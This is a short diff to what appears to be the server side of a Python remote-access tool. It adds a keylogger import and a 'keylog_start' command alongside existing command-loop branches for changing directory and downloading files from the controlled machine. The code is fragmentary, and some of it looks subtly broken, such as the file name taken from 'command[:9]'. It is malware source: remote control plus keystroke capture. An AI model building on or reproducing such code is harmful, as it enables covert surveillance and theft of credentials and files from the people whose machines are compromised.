@@ -1,6 +1,8 @@
 import socket
 import json
 import base64
+import threading
+from keylogger import Keylogger as keylogger
 
 
 class Server:
@@ -32,6 +34,8 @@ class Server:
             if command == "q":
                 break
             elif command[:2] == "cd" and len(command) > 1:
+                continue
+            elif command[:12] == "keylog_start":
                 continue
             elif command[:8] == "download":
                 with open(command[:9], "wb") as file:
